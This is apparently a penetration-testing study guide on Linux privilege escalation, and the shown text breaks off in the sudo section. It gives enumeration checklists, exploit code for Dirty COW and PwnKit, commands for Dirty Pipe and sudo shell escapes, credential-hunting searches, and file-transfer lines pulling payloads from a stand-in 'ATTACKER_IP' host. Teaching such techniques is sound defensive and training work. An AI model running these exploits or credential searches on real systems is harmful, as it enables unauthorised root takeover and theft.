# Linux Privilege Escalation: From User to Root - COMPREHENSIVE GUIDE

---
title: "Linux Privilege Escalation"
parent: "[[03_Linux]]"
tags:
  - linux
  - privesc
  - exploit
  - kernel
  - sudo
  - suid
  - cron
  - capabilities
  - container-escape
  - gtfobins
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: Gaining initial access to a Linux system is just the first step in a penetration test or CTF challenge. The real prize is **root access** (UID 0) - the keys to the kingdom. Linux Privilege Escalation (PrivEsc) is the systematic process of exploiting misconfigurations, vulnerable software, insecure permissions, or kernel vulnerabilities to elevate your privileges from a low-privileged user to root. This is arguably THE MOST CRITICAL skill for OSCP certification and real-world penetration testing.
>
> In this comprehensive guide, we'll cover everything from absolute basics (what IS privilege escalation?) to advanced exploitation techniques used by professional penetration testers. You'll learn the complete enumeration methodology, understand how to exploit sudo misconfigurations, SUID binaries, cron jobs, kernel vulnerabilities, Linux capabilities, container escapes, and much more. Each technique includes working code examples, ASCII diagrams, hands-on labs, and real OSCP-style scenarios. Whether you're preparing for OSCP, pursuing a career in offensive security, or just want to understand Linux security in depth, this guide will take you from zero to hero in Linux privilege escalation.
>
> **Why This Matters**: According to industry reports, privilege escalation vulnerabilities are found in over 80% of penetration tests. The difference between a failed engagement and a successful compromise often comes down to thorough enumeration and knowledge of PrivEsc techniques. This guide will teach you to think like an attacker and systematically discover the "one thing the admin forgot" that bridges the gap between standard user and root.

---

## Table of Contents

1. [Introduction: What is Privilege Escalation?](#1-introduction-what-is-privilege-escalation)
2. [The Complete Enumeration Methodology](#2-the-complete-enumeration-methodology)
3. [Automated Enumeration Tools](#3-automated-enumeration-tools)
4. [Pillar 1: Kernel Exploits](#4-pillar-1-kernel-exploits)
5. [Pillar 2: Sudo Misconfigurations](#5-pillar-2-sudo-misconfigurations)
6. [Pillar 3: SUID and SGID Binaries](#6-pillar-3-suid-and-sgid-binaries)
7. [Pillar 4: Linux Capabilities](#7-pillar-4-linux-capabilities)
8. [Pillar 5: Cron Job Exploitation](#8-pillar-5-cron-job-exploitation)
9. [Pillar 6: Writable Files and Directories](#9-pillar-6-writable-files-and-directories)
10. [Pillar 7: Password Hunting](#10-pillar-7-password-hunting)
11. [Pillar 8: NFS Exploitation](#11-pillar-8-nfs-exploitation)
12. [Pillar 9: Container Escapes](#12-pillar-9-container-escapes)
13. [PATH Hijacking Techniques](#13-path-hijacking-techniques)
14. [LD_PRELOAD and LD_LIBRARY_PATH Exploitation](#14-ld_preload-and-ld_library_path-exploitation)
15. [Shared Library Injection](#15-shared-library-injection)
16. [Python Library Hijacking](#16-python-library-hijacking)
17. [Environment Variables Exploitation](#17-environment-variables-exploitation)
18. [Wildcard Injection Attacks](#18-wildcard-injection-attacks)
19. [Exploiting Readable /etc/shadow](#19-exploiting-readable-etcshadow)
20. [Exploiting Writable /etc/passwd](#20-exploiting-writable-etcpasswd)
21. [Real-World OSCP Scenarios](#21-real-world-oscp-scenarios)
22. [Hands-On Labs](#22-hands-on-labs)
23. [Interview Questions and Answers](#23-interview-questions-and-answers)
24. [Summary and Checklist](#24-summary-and-checklist)

---

## 1. Introduction: What is Privilege Escalation?

### 1.1 Absolute Beginner Explanation

Imagine you've just broken into a large office building (legally, as a penetration tester, of course!). You managed to get through the front door by impersonating a delivery person - you're now **inside** the building. But you're not done yet. You're currently in the lobby with basic visitor access. Your goal is to reach the CEO's office on the top floor where all the sensitive documents are stored.

**Privilege escalation is the process of moving from the lobby to the CEO's office.**

In computer terms:
- **Initial Access** = Getting a shell on the system (you're in the lobby)
- **Standard User** = Limited permissions (UID 1000, can only access your own files)
- **Root Access** = Full system control (UID 0, can do anything)
- **Privilege Escalation** = The techniques to move from standard user to root

```
┌─────────────────────────────────────────────────────────────┐
│                  PRIVILEGE ESCALATION JOURNEY               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Step 1: Initial Access (Shell as low-priv user)           │
│  ┌────────────────────────────────────────┐                │
│  │  www-data@victim:/$                    │                │
│  │  UID: 33 (web server user)             │                │
│  │  Access: Web directories only          │                │
│  └────────────────────────────────────────┘                │
│                      ↓                                      │
│                      ↓ (Enumeration + Exploitation)         │
│                      ↓                                      │
│  Step 2: Root Access (UID 0)                                │
│  ┌────────────────────────────────────────┐                │
│  │  root@victim:/#                        │                │
│  │  UID: 0 (superuser)                    │                │
│  │  Access: EVERYTHING                    │                │
│  └────────────────────────────────────────┘                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 Why Privilege Escalation Matters

**For OSCP**: 
- Almost every OSCP lab machine requires privilege escalation to get the root flag
- You WILL encounter PrivEsc challenges in the exam
- It's often worth 20-30 points out of 100 on the exam

**For Real Penetration Tests**:
- Initial access is often as a low-privileged user (web server, database user)
- To demonstrate true business impact, you need to show you can compromise the entire system
- Root access = Full data exfiltration, persistence, lateral movement capability

**For Defense**:
- Understanding how attackers escalate privileges helps you harden systems
- Blue teamers need to know what red teamers look for

### 1.3 Types of Privilege Escalation

**Horizontal Privilege Escalation**: Moving from one user to another user of the same privilege level
- Example: user `alice` → user `bob` (both UID 1000+)
- Less common, but useful for accessing different data

**Vertical Privilege Escalation**: Moving from lower to higher privileges (THIS IS THE MAIN FOCUS)
- Example: user `www-data` (UID 33) → `root` (UID 0)
- This is what we mean by "privilege escalation" in most contexts

### 1.4 The Attacker's Mindset

When you land on a Linux box as a low-privileged user, you're looking for **the one thing the admin forgot**:

1. **Misconfigured sudo permissions** ("Oops, I gave the web user sudo access to vim")
2. **Writable scripts run by root** ("I didn't check permissions on that cron job script")
3. **Outdated kernel** ("I'll patch it next week... maybe")
4. **SUID binaries calling commands without full paths** ("PATH hijacking? What's that?")
5. **Overly permissive file permissions** ("Eh, 777 makes debugging easier")
6. **Passwords in config files** ("I'll remove that hardcoded password later")
7. **Dangerous capabilities** ("cap_setuid on Python? Seems fine")
8. **Container misconfigurations** ("Docker socket exposed? No problem")

**Your job**: Systematically enumerate until you find that mistake.

---

## 2. The Complete Enumeration Methodology

### 2.1 Why Enumeration is CRITICAL

```
┌────────────────────────────────────────────────────────┐
│  PRIVILEGE ESCALATION = 90% ENUMERATION, 10% EXPLOIT   │
├────────────────────────────────────────────────────────┤
│                                                        │
│  Amateur: Runs one tool, finds nothing, gives up      │
│  Pro: Systematically checks 50+ vectors               │
│                                                        │
│  "The exploit is obvious once you find it.            │
│   The hard part is finding it."                       │
│                                                        │
└────────────────────────────────────────────────────────┘
```

**DON'T**: Randomly try exploits and hope something works
**DO**: Follow a systematic checklist every single time

### 2.2 Manual Enumeration Checklist

This is your step-by-step guide. Go through EVERY item:

#### Phase 1: System Information

```bash
# Who am I?
id
whoami
groups

# What groups do I belong to?
id
# Look for: docker, lxd, disk, video, adm (all can lead to root)

# Current user info
cat /etc/passwd | grep $(whoami)

# Hostname and OS
hostname
uname -a
cat /etc/os-release
cat /etc/issue
lsb_release -a

# Kernel version (for kernel exploits)
uname -r
uname -mrs
cat /proc/version

# Environment variables (look for passwords, paths)
env
cat /etc/environment
cat /etc/profile
cat ~/.bashrc
cat ~/.bash_profile

# Current PATH
echo $PATH
```

**Example Output Analysis**:
```bash
$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)

# CRITICAL: User is in 'lxd' group → Container escape vector!
# CRITICAL: User is in 'sudo' group → Check sudo -l
# CRITICAL: User is in 'adm' group → Can read /var/log files
```

#### Phase 2: Sudo Rights

```bash
# Check sudo permissions (ALWAYS FIRST)
sudo -l

# If password is required but you have it, check:
sudo -l -U username

# Check sudoers file (if readable)
cat /etc/sudoers
cat /etc/sudoers.d/*

# Check for sudo version (some versions have CVEs)
sudo -V
```

**What to Look For**:
- `NOPASSWD` entries (can run command without password)
- `ALL=(ALL)` (can run any command as any user)
- Specific binaries you can run as root (check GTFOBins)
- `env_keep` options (especially `LD_PRELOAD`, `LD_LIBRARY_PATH`)

**Example**:
```
User john may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nmap
```
**Translation**: Immediate root via GTFOBins!

#### Phase 3: SUID/SGID Binaries

```bash
# Find all SUID binaries (run as owner)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find all SGID binaries (run as group owner)
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# More detailed listing
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

**What to Look For**:
- **Standard SUID binaries**: `/bin/su`, `/bin/sudo`, `/usr/bin/passwd` (normal)
- **Custom SUID binaries**: Anything in `/usr/local/bin`, `/home`, `/opt` (interesting!)
- **Known vulnerable SUID**: `nmap`, `vim`, `find`, `bash`, `more`, `less`, `nano`, `cp` (check GTFOBins)

#### Phase 4: Capabilities

```bash
# List all files with capabilities
getcap -r / 2>/dev/null

# Check specific binary
getcap /usr/bin/python3.8
```

**Dangerous Capabilities**:
- `cap_setuid` = Can change UID to 0 (root)
- `cap_dac_override` = Can read/write any file
- `cap_sys_admin` = Can mount filesystems, load kernel modules
- `cap_chown` = Can change file ownership

#### Phase 5: Cron Jobs

```bash
# System-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/

# User cron jobs
crontab -l
crontab -l -u username

# Check running cron processes
ps aux | grep cron
systemctl status cron

# Check for writable cron scripts
find /etc/cron* -type f -writable 2>/dev/null
```

**What to Look For**:
- Scripts run by root that you can write to
- Scripts run by root in directories you can write to
- Wildcards in cron commands (tar *, cp *, rsync *)
- Relative paths instead of absolute paths

#### Phase 6: Writable Files and Directories

```bash
# Writable files in /etc
find /etc -writable -type f 2>/dev/null

# Writable directories in /etc
find /etc -writable -type d 2>/dev/null

# Files you own
find / -user $(whoami) 2>/dev/null

# World-writable files
find / -perm -0002 -type f 2>/dev/null

# World-writable directories
find / -perm -0002 -type d 2>/dev/null

# Files with no owner
find / -nouser 2>/dev/null
```

**Critical Files to Check**:
- `/etc/passwd` (writable = add root user)
- `/etc/shadow` (writable = change root password)
- `/etc/sudoers` (writable = give yourself sudo)
- `/etc/crontab` (writable = run code as root)
- Systemd service files (writable = run code as root)

#### Phase 7: Running Processes

```bash
# All processes
ps aux
ps -ef
ps aux | grep root

# Process tree
pstree -p

# Processes by user
ps -u root

# Detailed process info
top -n 1
htop (if available)

# Check what files processes have open
lsof
lsof -u root
```

**What to Look For**:
- Root processes running from writable directories
- Services running as root with known vulnerabilities
- Database servers (credentials in processes)
- Internal services listening on localhost only

#### Phase 8: Network Information

```bash
# Network interfaces
ifconfig
ip addr
ip a

# Routing table
route
ip route
netstat -rn

# Open ports
netstat -antup
netstat -tunlp
ss -tunlp
lsof -i

# Active connections
netstat -antp
ss -antp

# Check iptables rules
iptables -L -n
iptables -L -n -v
```

**What to Look For**:
- Services running on localhost only (127.0.0.1) - can be accessed via port forwarding
- Multiple network interfaces (pivot opportunities)
- Unusual ports

#### Phase 9: Password Hunting

```bash
# History files
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
cat ~/.zsh_history
find / -name "*_history" 2>/dev/null

# Config files
find / -name "*.conf" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.config" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.ini" 2>/dev/null | xargs grep -i "password" 2>/dev/null

# Web configs
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
find /var/www -name "*.php" -exec grep -i "password" {} \; 2>/dev/null

# Database files
locate password | grep -v "lib"
find / -name "*.db" 2>/dev/null
find / -name "*.sql" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find /home -name "*.ssh" 2>/dev/null

# Environment variables
env | grep -i pass
cat /etc/environment | grep -i pass
```

#### Phase 10: NFS Shares

```bash
# Check for NFS exports
cat /etc/exports
showmount -e localhost
showmount -e <target_ip>

# Check mounted shares
mount
df -h
cat /etc/fstab
```

**What to Look For**:
- `no_root_squash` option (allows creating SUID binaries as root)
- Writable NFS shares

#### Phase 11: Kernel Modules and Drivers

```bash
# Loaded kernel modules
lsmod
cat /proc/modules

# Available modules
ls -la /lib/modules/$(uname -r)/

# Can we load modules?
/sbin/modprobe -n -v helloworld
```

### 2.3 Enumeration Script

Here's a quick manual enumeration script you can paste:

```bash
#!/bin/bash
# Quick Linux PrivEsc Enumeration Script

echo "=== SYSTEM INFO ==="
echo "[*] Hostname: $(hostname)"
echo "[*] Kernel: $(uname -r)"
echo "[*] OS: $(cat /etc/issue | head -1)"
echo ""

echo "=== USER INFO ==="
echo "[*] Current User: $(whoami)"
echo "[*] ID: $(id)"
echo "[*] Groups: $(groups)"
echo ""

echo "=== SUDO RIGHTS ==="
sudo -l 2>/dev/null
echo ""

echo "=== SUID BINARIES ==="
find / -perm -4000 -type f 2>/dev/null
echo ""

echo "=== CAPABILITIES ==="
getcap -r / 2>/dev/null
echo ""

echo "=== CRON JOBS ==="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null
crontab -l 2>/dev/null
echo ""

echo "=== WRITABLE /etc FILES ==="
find /etc -writable -type f 2>/dev/null
echo ""

echo "=== NETWORK INFO ==="
netstat -tunlp 2>/dev/null || ss -tunlp 2>/dev/null
echo ""

echo "=== NFS EXPORTS ==="
cat /etc/exports 2>/dev/null
echo ""

echo "=== PASSWORD FILES ==="
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
echo ""

echo "=== INTERESTING GROUPS ==="
if groups | grep -qE "docker|lxd|disk|video|root|sudo"; then
    echo "[!] User is in interesting group: $(groups)"
fi
echo ""

echo "=== ENUMERATION COMPLETE ==="
```

---

## 3. Automated Enumeration Tools

### 3.1 LinPEAS (Linux Privilege Escalation Awesome Script)

**The Industry Standard**. Color-coded, comprehensive, LOUD (writes to disk).

```bash
# Download
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Transfer to victim
# Method 1: Python HTTP server
# On attacker: python3 -m http.server 80
# On victim: wget http://ATTACKER_IP/linpeas.sh

# Method 2: Base64 encode/decode
# On attacker: base64 -w0 linpeas.sh
# On victim: echo "BASE64_HERE" | base64 -d > linpeas.sh

# Run
chmod +x linpeas.sh
./linpeas.sh

# Run and save output
./linpeas.sh | tee linpeas_output.txt

# Run with thorough check (slower but more comprehensive)
./linpeas.sh -a

# Run quietly (less noise)
./linpeas.sh -q
```

**What LinPEAS Checks** (50+ checks):
- ✅ Sudo permissions
- ✅ SUID/SGID binaries
- ✅ Capabilities
- ✅ Cron jobs
- ✅ Writable files
- ✅ Passwords in files
- ✅ Known CVEs
- ✅ Network information
- ✅ Container breakout vectors
- ✅ And much more...

**Color Coding**:
- **Red/Yellow**: High priority, likely exploitable
- **Green**: Interesting, investigate
- **Blue**: Informational

**LinPEAS Output Example**:
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
User john may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/vim

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid
-rwsr-xr-x 1 root root 117K /usr/bin/find
-rwsr-xr-x 1 root root 40K /usr/local/bin/backup
```

### 3.2 LinEnum

**Solid Alternative**. Bash script, comprehensive output.

```bash
# Download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Run
chmod +x LinEnum.sh
./LinEnum.sh

# Run thorough mode
./LinEnum.sh -t

# Save output
./LinEnum.sh -t > linenum_output.txt
```

### 3.3 Linux Smart Enumeration (LSE)

**Fast and Smart**. Has different verbosity levels.

```bash
# Download
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh

# Run (level 0 - least verbose)
./lse.sh -l 0

# Run (level 1 - normal)
./lse.sh -l 1

# Run (level 2 - very verbose)
./lse.sh -l 2

# Run and show only high priority findings
./lse.sh -l 1 -i
```

### 3.4 Linux Exploit Suggester

**Kernel Exploit Finder**. Suggests kernel exploits based on version.

```bash
# Download
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# Run
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

**Example Output**:
```
Possible Exploits:
[+] [CVE-2016-5195] dirtycow
   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.10.0-*},RHEL=7{kernel:3.10.0-*},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
```

### 3.5 pspy (Monitor Processes Without Root)

**Watches Running Processes**. Great for finding cron jobs that don't show up in `/etc/crontab`.

```bash
# Download (64-bit)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

# Run
chmod +x pspy64
./pspy64

# Run with process tree
./pspy64 -pf
```

**Use Case**: Discover hidden cron jobs, find root processes calling scripts you can modify.

### 3.6 unix-privesc-check

**Old but Gold**. Comprehensive bash script.

```bash
# Download
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check

# Run standard mode
./unix-privesc-check standard

# Run detailed mode
./unix-privesc-check detailed
```

### 3.7 Tool Comparison

```
┌─────────────────────────────────────────────────────────────┐
│             ENUMERATION TOOL COMPARISON                     │
├─────────────────┬──────────┬──────────┬───────────┬─────────┤
│ Tool            │ Speed    │ Stealth  │ Detail    │ OSCP?   │
├─────────────────┼──────────┼──────────┼───────────┼─────────┤
│ LinPEAS         │ Medium   │ Low      │ Excellent │ YES     │
│ LinEnum         │ Fast     │ Medium   │ Good      │ YES     │
│ LSE             │ Fast     │ High     │ Good      │ YES     │
│ pspy            │ Passive  │ High     │ Specific  │ YES     │
│ Manual          │ Slow     │ High     │ Depends   │ ALWAYS  │
└─────────────────┴──────────┴──────────┴───────────┴─────────┘

Recommendation: Run LinPEAS first, then manually verify findings.
```

---

## 4. Pillar 1: Kernel Exploits

### 4.1 What is a Kernel Exploit?

The **kernel** is the core of the operating system. It runs with the highest privileges (ring 0) and controls everything. If you can exploit a vulnerability in the kernel, you can gain root access.

**Analogy**: The kernel is like the security system of the building. If you find a bug in the security system itself, you can bypass ALL the locks.

**Warning**: Kernel exploits can **crash the system**. Use as a last resort in production environments. Safe to use in OSCP labs/exam.

### 4.2 Kernel Exploit Strategy

```
┌────────────────────────────────────────────────────────────┐
│           KERNEL EXPLOITATION WORKFLOW                     │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  1. Identify Kernel Version                                │
│     ↓                                                      │
│  2. Search for Known CVEs                                  │
│     ↓                                                      │
│  3. Match CPU Architecture (x86 vs x64)                    │
│     ↓                                                      │
│  4. Download Exploit Code                                  │
│     ↓                                                      │
│  5. Compile on Similar System                              │
│     ↓                                                      │
│  6. Transfer to Victim                                     │
│     ↓                                                      │
│  7. Execute (Cross Fingers!)                               │
│     ↓                                                      │
│  8. Clean Up Traces                                        │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### 4.3 Checking Kernel Version

```bash
# Full kernel version
uname -a
# Output: Linux victim 3.13.0-32-generic #57-Ubuntu SMP x86_64 GNU/Linux

# Just kernel release
uname -r
# Output: 3.13.0-32-generic

# CPU architecture
uname -m
# Output: x86_64 (64-bit) or i686 (32-bit)

# Detailed version info
cat /proc/version

# Distribution info
cat /etc/os-release
lsb_release -a
```

### 4.4 Searching for Kernel Exploits

**Method 1: searchsploit (Exploit-DB)**

```bash
# On Kali (attacker machine)
searchsploit linux kernel 3.13
searchsploit linux kernel 3.13 ubuntu
searchsploit -w linux kernel 3.13  # Get URLs

# Filter by privilege escalation
searchsploit linux kernel 3.13 | grep -i "privilege escalation"

# Get exploit details
searchsploit -x exploits/linux/local/12345.c
```

**Method 2: Linux Exploit Suggester**

```bash
./linux-exploit-suggester.sh
```

**Method 3: Google**

```
site:exploit-db.com linux kernel 3.13 privilege escalation
site:github.com CVE-2016-5195 exploit
```

### 4.5 Famous Kernel Exploits

#### 4.5.1 Dirty COW (CVE-2016-5195)

**One of the most famous kernel exploits**. Race condition in memory management.

**Affected Versions**: Linux Kernel < 4.8.3, < 4.7.9, < 4.4.26

**How It Works**: Race condition in the Copy-On-Write (COW) mechanism allows overwriting read-only memory.

```bash
# Check vulnerability
uname -r
# If kernel < 4.8.3, likely vulnerable

# Download exploit
searchsploit -m 40611
# Or: wget https://www.exploit-db.com/download/40611

# Compile
gcc -pthread dirty.c -o dirty -lcrypt

# Run
./dirty

# Enter new password when prompted
# Creates new root user "firefart"

# Login as firefart
su firefart
# Enter the password you set
```

**Full Exploit Code** (dirty.c):

```c
/*
 * Dirty COW (CVE-2016-5195)
 * Simplified version for educational purposes
 */
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int fd;
char *password_line = "firefart:fiPeL7I0lW2rY:0:0:pwned:/root:/bin/bash\n";

void *madviseThread(void *arg) {
    char *str = (char*)arg;
    int i, c = 0;
    for(i = 0; i < 1000000 && !c; i++) {
        c = madvise(map, 100, MADV_DONTNEED);
    }
    return NULL;
}

void *procselfmemThread(void *arg) {
    char *str = (char*)arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 1000000 && !c; i++) {
        lseek(f, (uintptr_t) map, SEEK_SET);
        c = write(f, str, strlen(str));
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;
    
    fd = open("/etc/passwd", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1;
    }
    
    map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    printf("[*] Launching Dirty COW exploit...\n");
    printf("[*] Overwriting /etc/passwd...\n");
    
    pthread_create(&pth1, NULL, madviseThread, password_line);
    pthread_create(&pth2, NULL, procselfmemThread, password_line);
    
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    
    printf("[*] Done! Try logging in as 'firefart' with password you set.\n");
    return 0;
}
```

#### 4.5.2 PwnKit (CVE-2021-4034)

**Recent and powerful**. Polkit pkexec vulnerability.

**Affected**: PolicyKit (polkit) - Present on most major Linux distributions since 2009

**How It Works**: Vulnerability in `pkexec` allows any user to execute code as root.

```bash
# Download exploit
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034

# Compile
make

# Run
./cve-2021-4034

# If successful, you get root shell
```

**Exploit Code** (cve-2021-4034.c - simplified):

```c
/*
 * PwnKit - CVE-2021-4034
 * Polkit pkexec privilege escalation
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    char *env[] = {
        "pwnkit.so:.",
        "PATH=GCONV_PATH=.",
        "SHELL=lol",
        NULL
    };
    
    char *args[] = { NULL };
    
    printf("[*] PwnKit - CVE-2021-4034\n");
    printf("[*] Exploiting pkexec...\n");
    
    execve("/usr/bin/pkexec", args, env);
    
    perror("execve");
    return 1;
}
```

**Create malicious library** (pwnkit.c):

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    exit(0);
}
```

**Compile and run**:

```bash
# Compile library
gcc -shared -fPIC -o pwnkit.so pwnkit.c

# Compile exploit
gcc cve-2021-4034.c -o cve-2021-4034

# Run
./cve-2021-4034
# Root shell!
```

#### 4.5.3 Dirty Pipe (CVE-2022-0847)

**Very recent**. Allows overwriting data in read-only files.

**Affected**: Linux Kernel 5.8 - 5.16.11, 5.15.25, 5.10.102

```bash
# Download
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c

# Compile
gcc exploit-1.c -o dirtypipe

# Run (overwrites /etc/passwd)
./dirtypipe /etc/passwd 1 oot:
# This changes "root:" to "oot:" effectively removing root password

# Login as root (no password)
su root
```

#### 4.5.4 Other Notable Kernel Exploits

```bash
# CVE-2009-1185 (udev)
# Kernel: 2.6.x
searchsploit -m 8478

# CVE-2009-2698 (udp_sendmsg)
# Kernel: 2.6.0 - 2.6.19
searchsploit -m 9542

# CVE-2010-3904 (RDS)
# Kernel: 2.6.30 - 2.6.36
searchsploit -m 15285

# CVE-2016-0728 (keyring)
# Kernel: 3.8.0 - 4.4.1
https://www.exploit-db.com/exploits/39277

# CVE-2017-16995 (eBPF)
# Kernel: 4.4.0 - 4.14.11
https://www.exploit-db.com/exploits/45010

# CVE-2021-3493 (OverlayFS)
# Ubuntu kernels before 2021-03-07
https://www.exploit-db.com/exploits/49808
```

### 4.6 Compiling Exploits

**Problem**: Victim machine often doesn't have gcc installed.

**Solution**: Compile on a similar system (or Kali) and transfer the binary.

```bash
# On Kali/Attacker (compile for 64-bit)
gcc exploit.c -o exploit

# Compile for 32-bit (from 64-bit Kali)
gcc -m32 exploit.c -o exploit

# Compile statically (includes all libraries)
gcc -static exploit.c -o exploit

# Cross-compile for ARM
arm-linux-gnueabi-gcc exploit.c -o exploit

# Transfer to victim
# Method 1: HTTP
python3 -m http.server 80
# On victim: wget http://ATTACKER_IP/exploit

# Method 2: Netcat
# On attacker: nc -lvnp 1234 < exploit
# On victim: nc ATTACKER_IP 1234 > exploit

# Method 3: Base64
# On attacker: base64 exploit
# On victim: echo "BASE64_HERE" | base64 -d > exploit

# Make executable
chmod +x exploit

# Run
./exploit
```

### 4.7 Kernel Exploit Workflow Example

```bash
# 1. Check kernel version
uname -r
# Output: 3.13.0-32-generic

# 2. Search for exploits
searchsploit linux kernel 3.13
# Found: CVE-2016-5195 (Dirty COW)

# 3. Download exploit
searchsploit -m 40611
mv 40611.c dirty.c

# 4. Transfer to victim (if needed)
# Already on victim for this example

# 5. Compile
gcc -pthread dirty.c -o dirty -lcrypt

# 6. Run
./dirty mypassword

# 7. Wait for exploit to complete
# [*] mmap: 7f1234567000
# [*] madvise: 0
# [*] ptrace: 0

# 8. Login as new root user
su firefart
# Password: mypassword

# 9. Verify root
id
# uid=0(firefart) gid=0(root) groups=0(root)

# 10. Success!
```

### 4.8 When to Use Kernel Exploits

**Use kernel exploits when**:
- ✅ All other PrivEsc methods exhausted
- ✅ In a lab/CTF environment
- ✅ You have permission (engagement scope allows)
- ✅ You have a backup/snapshot of the system

**DON'T use kernel exploits when**:
- ❌ On production systems without explicit permission
- ❌ Before trying safer methods
- ❌ Without understanding the exploit (could cause permanent damage)
- ❌ On systems you can't risk crashing

**OSCP Note**: Kernel exploits are fair game in OSCP labs/exam, but usually there's a safer way.

---

## 5. Pillar 2: Sudo Misconfigurations

### 5.1 Understanding Sudo

**sudo** = "**S**uper**u**ser **do**"

Allows a permitted user to execute a command as root (or another user).

**Real-World Analogy**: Sudo is like having a manager's key card that lets you access certain restricted areas of the building, even though you're not the manager.

```
┌────────────────────────────────────────────────────────┐
│                    SUDO WORKFLOW                       │
├────────────────────────────────────────────────────────┤
│                                                        │
│  Regular User (UID 1000)                               │
│         ↓                                              │
│  Runs: sudo /usr/bin/vim                               │
│         ↓                                              │
│  Sudo checks: /etc/sudoers                             │
│         ↓                                              │
│  If allowed: Execute vim as root (UID 0)               │
│         ↓                                              │
│  User is now in vim running with root privileges       │
│         ↓                                              │
│  Shell escape: :!/bin/bash                             │
│         ↓                                              │
│  ROOT SHELL                                            │
│                                                        │
└────────────────────────────────────────────────────────┘
```

### 5.2 Checking Sudo Permissions

```bash
# Check what you can run with sudo (ALWAYS FIRST COMMAND)
sudo -l

# If you know a password
sudo -l -U username

# Check sudoers file (if readable - usually not)
cat /etc/sudoers
ls -la /etc/sudoers.d/
```

**Example Output**:
```
Matching Defaults entries for john on victim:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/find
    (ALL : ALL) /usr/bin/less
```

**Translation**:
- `NOPASSWD` = Don't need password to run this command
- `(root)` = Can run as root user
- `(ALL : ALL)` = Can run as any user and any group
- No `NOPASSWD` on `/usr/bin/less` = Need to enter your password

### 5.3 GTFOBins - Your Best Friend

**GTFOBins** (https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited to bypass security restrictions.

If you can run ANY of these with sudo, you can likely get root:

**Common GTFOBins for Sudo**:
- `vim`, `vi`, `nano`, `emacs` (text editors)
- `less`, `more`, `man` (pagers)
- `find`, `locate` (file search)
- `awk`, `sed`, `perl`, `python`, `ruby`, `php` (scripting languages)
- `nmap` (network scanner - older versions)
- `tcpdump` (packet sniffer)
- `git`, `tar`, `zip`, `unzip` (utilities)
- `docker`, `lxc` (containers)

### 5.4 Sudo Exploitation Examples

#### Example 1: vim/vi

```bash
# Check permissions
sudo -l
# Output: (root) NOPASSWD: /usr/bin/vim

# Method 1: Shell escape
sudo vim
# Inside vim:
:!/bin/bash

# Method 2: One-liner
sudo vim -c ':!/bin/bash'

# Method 3: Set shell
sudo vim -c ':set shell=/bin/bash' -c ':shell'
```

#### Example 2: find

```bash
# Check permissions
sudo -l
